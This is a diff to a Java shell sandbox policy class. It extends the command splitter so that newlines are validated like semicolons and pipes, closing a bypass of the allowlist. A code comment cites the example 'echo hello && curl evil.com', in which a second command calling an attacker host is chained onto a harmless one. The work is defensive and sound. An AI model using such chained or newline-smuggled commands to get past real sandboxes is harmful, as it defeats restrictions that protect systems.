@@ -416,7 +416,8 @@ public class ShellSandboxPolicy {
       return ValidationResult.block("Relative parent directory navigation blocked (cd ..)");
     }
 
-    // Split on chain operators (&&, ||, ;, |) and validate EACH segment's first token
+    // Split on shell command separators (&&, ||, ;, |, newline) and validate EACH segment's first
+    // token
     // against the allowlist. This prevents "echo hello && curl evil.com" from passing.
     List<String> segments = splitChainedCommands(normalized);
     for (String segment : segments) {
@@ -431,7 +432,7 @@ public class ShellSandboxPolicy {
   }
 
   /**
-   * Splits a command string on &&, ||, ;, and | operators. Respects quoted strings (single and
+   * Splits a command string on &&, ||, ;, |, and raw newlines. Respects quoted strings (single and
    * double quotes) — does not split inside them.
    */
   private List<String> splitChainedCommands(String command) {
@@ -470,8 +471,9 @@ public class ShellSandboxPolicy {
         }
       }
 
-      // Split on ; and single |
-      if (c == ';' || c == '|') {
+      // Split on ;, single |, and raw newlines. /bin/sh treats newlines as command separators, so
+      // they must get the same per-segment allowlist validation as semicolons.
+      if (c == ';' || c == '|' || c == '\n' || c == '\r') {
         segments.add(current.toString());
         current.setLength(0);
         continue;
